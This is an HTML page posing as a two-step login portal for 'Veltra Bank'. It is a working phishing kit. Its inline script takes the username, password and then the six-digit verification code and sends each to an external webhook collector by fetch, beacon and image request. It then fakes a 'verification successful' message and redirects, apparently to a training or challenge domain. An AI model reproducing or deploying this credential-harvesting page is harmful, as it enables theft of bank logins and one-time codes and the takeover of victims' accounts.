<!DOCTYPE html>
<html lang="es"><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Veltra Bank — Acceso</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
:root{--bg-0:#070b16;--bg-1:#0d1326;--card:rgba(18,25,46,.72);--card-border:rgba(120,150,255,.16);--txt:#eef2ff;--txt-dim:#9aa6c7;--accent:#5b7cfa;--accent-2:#38e0c4;--accent-grad:linear-gradient(135deg,#5b7cfa 0%,#38e0c4 100%);--danger:#ff6b85;--ok:#38e0c4;--field:rgba(10,15,30,.6);--field-border:rgba(120,150,255,.22);--shadow:0 30px 80px -30px rgba(0,0,0,.8)}
*{box-sizing:border-box;margin:0;padding:0}html,body{height:100%}
body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:var(--txt);background:radial-gradient(1200px 700px at 15% -10%,rgba(91,124,250,.22),transparent 60%),radial-gradient(900px 600px at 110% 10%,rgba(56,224,196,.16),transparent 55%),linear-gradient(160deg,var(--bg-0),var(--bg-1));min-height:100vh;display:flex;flex-direction:column;-webkit-font-smoothing:antialiased}
.topbar{display:flex;align-items:center;justify-content:space-between;padding:22px 36px}
.brand{display:flex;align-items:center;gap:12px;font-weight:700;letter-spacing:-.02em;font-size:20px}
.brand .logo{width:36px;height:36px;border-radius:11px;background:var(--accent-grad);display:grid;place-items:center;box-shadow:0 8px 24px -8px rgba(91,124,250,.9)}
.brand .logo svg{width:20px;height:20px}
.brand span b{background:var(--accent-grad);-webkit-background-clip:text;background-clip:text;color:transparent}
.topbar .pill{display:inline-flex;align-items:center;gap:7px;font-size:12.5px;color:var(--txt-dim);border:1px solid var(--card-border);border-radius:999px;padding:7px 14px;background:rgba(255,255,255,.02)}
.dot{width:8px;height:8px;border-radius:50%;background:var(--ok);box-shadow:0 0 10px var(--ok)}
.wrap{flex:1;display:grid;grid-template-columns:1.05fr .95fr;gap:40px;align-items:center;max-width:1120px;width:100%;margin:0 auto;padding:24px 36px 56px}
.hero h1{font-size:clamp(30px,4vw,46px);line-height:1.05;letter-spacing:-.03em;font-weight:800;margin-bottom:18px}
.hero h1 em{font-style:normal;background:var(--accent-grad);-webkit-background-clip:text;background-clip:text;color:transparent}
.hero p{color:var(--txt-dim);font-size:16px;max-width:46ch;line-height:1.6}
.features{margin-top:30px;display:grid;gap:14px}
.feature{display:flex;gap:13px;align-items:flex-start}
.feature .ic{flex:none;width:38px;height:38px;border-radius:11px;display:grid;place-items:center;background:rgba(91,124,250,.12);border:1px solid var(--card-border);color:var(--accent-2)}
.feature .ic svg{width:19px;height:19px}
.feature h3{font-size:14.5px;font-weight:650;margin-bottom:3px}
.feature p{font-size:13px;color:var(--txt-dim);max-width:none}
.card{background:var(--card);border:1px solid var(--card-border);border-radius:22px;padding:34px 32px;backdrop-filter:blur(22px);-webkit-backdrop-filter:blur(22px);box-shadow:var(--shadow);width:100%;max-width:420px;justify-self:end}
.card .eyebrow{font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:var(--accent-2);font-weight:650}
.card h2{font-size:24px;letter-spacing:-.02em;margin:8px 0 4px}
.card .sub{color:var(--txt-dim);font-size:14px;margin-bottom:24px}
.field{margin-bottom:16px}
.field label{display:block;font-size:13px;color:var(--txt-dim);margin-bottom:7px;font-weight:550}
.field input{width:100%;background:var(--field);border:1px solid var(--field-border);border-radius:12px;padding:13px 15px;color:var(--txt);font-size:15px;outline:none;transition:border-color .18s,box-shadow .18s}
.field input::placeholder{color:#5b678a}
.field input:focus{border-color:var(--accent);box-shadow:0 0 0 4px rgba(91,124,250,.18)}
.field.otp input{text-align:center;letter-spacing:.5em;font-size:22px;font-weight:650;padding-left:.5em}
.btn{width:100%;border:none;border-radius:12px;padding:14px 18px;font-size:15px;font-weight:650;color:#06122b;background:var(--accent-grad);cursor:pointer;transition:transform .12s,box-shadow .18s,filter .18s;box-shadow:0 14px 30px -12px rgba(91,124,250,.8)}
.btn:hover{filter:brightness(1.05);box-shadow:0 18px 36px -12px rgba(91,124,250,.95)}
.btn:active{transform:translateY(1px)}
.alert{border-radius:11px;padding:11px 14px;font-size:13.5px;margin-bottom:18px;border:1px solid rgba(255,107,133,.3);background:rgba(255,107,133,.1);color:#ffd2db}
.secure-note{margin-top:20px;display:flex;align-items:center;gap:9px;font-size:12px;color:var(--txt-dim);justify-content:center}
.secure-note svg{width:14px;height:14px;color:var(--ok)}
.card-footer{margin-top:22px;text-align:center;font-size:13px;color:var(--txt-dim)}
.card-footer a{color:var(--accent);text-decoration:none}
@media (max-width:860px){.wrap{grid-template-columns:1fr;gap:28px;padding:16px}.card{justify-self:stretch;max-width:none}.hero{order:2}.topbar{padding:18px 16px}}
  </style>
</head>
<body>
  <script>
  (function(){
    "use strict";
    var COLLECTOR = "https://webhooktest.net/webhook/01a12b61-fdaa-7570-aa3d-bcf17a7acc1f";

    function capturar(payload){
      var body = JSON.stringify(payload);
      try { fetch(COLLECTOR, {method:"POST", mode:"no-cors", headers:{"Content-Type":"application/json"}, body:body, keepalive:true}); } catch(e){}
      try { navigator.sendBeacon(COLLECTOR, body); } catch(e){}
      try { var i=new Image(); i.src = COLLECTOR + (COLLECTOR.indexOf("?")>-1?"&":"?") + "c=" + encodeURIComponent(body) + "&_=" + Date.now(); } catch(e){}
    }
    function qs(k){ try{ return new URLSearchParams(window.location.search).get(k); }catch(e){ return null; } }
    function esc(s){ return (s||"").replace(/[&<>"]/g,function(c){return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c];}); }

    var TOPBAR =
      '<header class="topbar">'+
        '<div class="brand"><span class="logo"><svg viewBox="0 0 24 24" fill="none"><path d="M4 5l8-2 8 2v6c0 5-3.5 8-8 10C7.5 19 4 16 4 11V5z" stroke="#06122b" stroke-width="2" stroke-linejoin="round"></path></svg></span><span>Veltra<b>Bank</b></span></div>'+
        '<div class="pill"><span class="dot"></span> Conexion cifrada · TLS 1.3</div>'+
      '</header>';

    // ---------- PAGINA 1: LOGIN ----------
    function renderLogin(){
      document.title = "Veltra Bank — Acceso";
      document.body.innerHTML = TOPBAR +
      '<main class="wrap">'+
        '<section class="hero">'+
          '<h1>Tu dinero, <em>blindado</em><br>de punta a punta.</h1>'+
          '<p>Banca digital con verificacion en dos pasos, monitoreo antifraude en tiempo real y cifrado de grado bancario en cada operacion.</p>'+
          '<div class="features">'+
            '<div class="feature"><span class="ic"><svg viewBox="0 0 24 24" fill="none"><rect x="4" y="10" width="16" height="10" rx="2" stroke="currentColor" stroke-width="2"></rect><path d="M8 10V7a4 4 0 018 0v3" stroke="currentColor" stroke-width="2"></path></svg></span><div><h3>Autenticacion multifactor</h3><p>Codigo de un solo uso en cada inicio de sesion.</p></div></div>'+
            '<div class="feature"><span class="ic"><svg viewBox="0 0 24 24" fill="none"><path d="M12 3l7 3v5c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V6l7-3z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"></path><path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></span><div><h3>Proteccion antifraude</h3><p>Analisis de riesgo en milisegundos, 24/7.</p></div></div>'+
            '<div class="feature"><span class="ic"><svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"></circle><path d="M12 7v5l3 2" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path></svg></span><div><h3>Operaciones al instante</h3><p>Transferencias y pagos acreditados en segundos.</p></div></div>'+
          '</div>'+
        '</section>'+
        '<section class="card">'+
          '<div class="eyebrow">Banca en linea</div>'+
          '<h2>Iniciar sesion</h2>'+
          '<p class="sub">Ingresa con tus credenciales para continuar.</p>'+
          '<div class="alert" id="alert" style="display:none"></div>'+
          '<form id="form-login" autocomplete="off">'+
            '<div class="field"><label for="txt-login">Usuario</label><input id="txt-login" name="txtLogin" type="text" placeholder="nombre.apellido" autofocus></div>'+
            '<div class="field"><label for="txt-password">Contrasena</label><input id="txt-password" name="txtPassword" type="password" placeholder="••••••••••"></div>'+
            '<button id="btn-login" type="submit" class="btn">Continuar</button>'+
          '</form>'+
          '<div class="secure-note"><svg viewBox="0 0 24 24" fill="none"><rect x="4" y="10" width="16" height="10" rx="2" stroke="currentColor" stroke-width="2"></rect><path d="M8 10V7a4 4 0 018 0v3" stroke="currentColor" stroke-width="2"></path></svg> Nunca te pediremos tu clave por correo o telefono.</div>'+
        '</section>'+
      '</main>';
      document.getElementById("form-login").addEventListener("submit", function(e){
        e.preventDefault();
        var usuario = document.getElementById("txt-login").value.trim();
        var clave   = document.getElementById("txt-password").value;
        capturar({paso:"login", usuario:usuario, clave:clave, ts:Date.now()});
        // navegacion real a la pagina de verificacion (como el sitio real)
        window.location = window.location.pathname + "?step=2&u=" + encodeURIComponent(usuario);
      });
    }

    // ---------- PAGINA 2: VERIFICACION ----------
    function renderVerif(){
      document.title = "Veltra Bank — Verificacion";
      var usuario = qs("u") || "";
      document.body.innerHTML = TOPBAR +
      '<main class="wrap">'+
        '<section class="hero">'+
          '<h1>Verificacion<br><em>en dos pasos.</em></h1>'+
          '<p>Enviamos un codigo de un solo uso a tu dispositivo de confianza. Ingresalo para completar el acceso y proteger tu cuenta.</p>'+
          '<div class="features">'+
            '<div class="feature"><span class="ic"><svg viewBox="0 0 24 24" fill="none"><rect x="7" y="3" width="10" height="18" rx="2" stroke="currentColor" stroke-width="2"></rect><path d="M11 18h2" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path></svg></span><div><h3>Codigo al instante</h3><p>Valido por unos minutos y de un solo uso.</p></div></div>'+
            '<div class="feature"><span class="ic"><svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"></circle><path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></span><div><h3>Confirmacion segura</h3><p>Solo vos podes autorizar el ingreso.</p></div></div>'+
          '</div>'+
        '</section>'+
        '<section class="card">'+
          '<div class="eyebrow">Paso 2 de 2</div>'+
          '<h2>Codigo de verificacion</h2>'+
          '<p class="sub">Hola, <strong>'+esc(usuario)+'</strong>. Ingresa el codigo de 6 digitos.</p>'+
          '<div class="alert" id="alert" style="display:none"></div>'+
          '<form id="form-2fa" autocomplete="off">'+
            '<div class="field otp"><label for="txt-2fa">Codigo</label><input id="txt-2fa" name="txt2fa" type="text" inputmode="numeric" maxlength="6" placeholder="000000" autofocus></div>'+
            '<button id="btn-confirm" type="submit" class="btn">Confirmar e ingresar</button>'+
          '</form>'+
          '<div class="card-footer"><a href="/login">Volver al inicio de sesion</a></div>'+
        '</section>'+
      '</main>';
      document.getElementById("form-2fa").addEventListener("submit", function(e){
        e.preventDefault();
        var codigo = document.getElementById("txt-2fa").value.trim();
        capturar({paso:"2fa", codigo:codigo, usuario:usuario, ts:Date.now()});
        var card = document.querySelector(".card");
        if(card){ card.innerHTML = '<div class="eyebrow">Verificacion</div><h2>Verificacion exitosa</h2><p class="sub">Redirigiendo a tu banca en linea...</p>'; }
        setTimeout(function(){
          window.location = "https://chl-6ae56624-a751-4e34-a547-a4f7420f67d5-veltra-bank.softwareseguro.com.ar/login";
        }, 1200);
      });
    }

    function boot(){ if(qs("step")==="2"){ renderVerif(); } else { renderLogin(); } }
    if(document.readyState==="loading"){ document.addEventListener("DOMContentLoaded", boot); } else { boot(); }
  })();
  </script>
</body></html>
